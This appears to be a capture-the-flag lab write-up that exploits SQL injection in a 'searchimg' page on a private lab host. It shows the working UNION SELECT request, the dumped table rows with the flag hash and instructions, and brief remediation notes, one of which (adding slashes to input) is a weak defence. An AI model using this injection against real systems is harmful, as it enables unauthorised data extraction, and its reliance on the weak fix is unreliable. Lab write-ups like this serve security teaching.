Vulnerability 14
------

The page `searchimg` take get request for Database query
Write request and send execute it: `http://10.11.200.146/?page=searchimg&id=1+UNION+SELECT%20comment,title%20from%20Member_images.list_images%20&Submit=Submit#`   

We got:
```
ID: 1 UNION SELECT comment,title from Member_images.list_images  
Title: Nsa
Url : https://www.nsa.org/img.jpg

ID: 1 UNION SELECT comment,title from Member_images.list_images  
Title: Nsa
Url : An image about the NSA !

ID: 1 UNION SELECT comment,title from Member_images.list_images  
Title: 42 !
Url : There is a number..

ID: 1 UNION SELECT comment,title from Member_images.list_images  
Title: Google
Url : Google it !

ID: 1 UNION SELECT comment,title from Member_images.list_images  
Title: Obama
Url : Yes we can !

ID: 1 UNION SELECT comment,title from Member_images.list_images  
Title: Hack me ?
Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

ID: 1 UNION SELECT comment,title from Member_images.list_images  
Title: tr00l
Url : Because why not ?
```

We found flag, we need to MD5 decode, lower case the result and sha256 it !

### Resolv ?
Always user prepared requests, where only field or value can be enter
Always addslash all user input
Remove javascript too
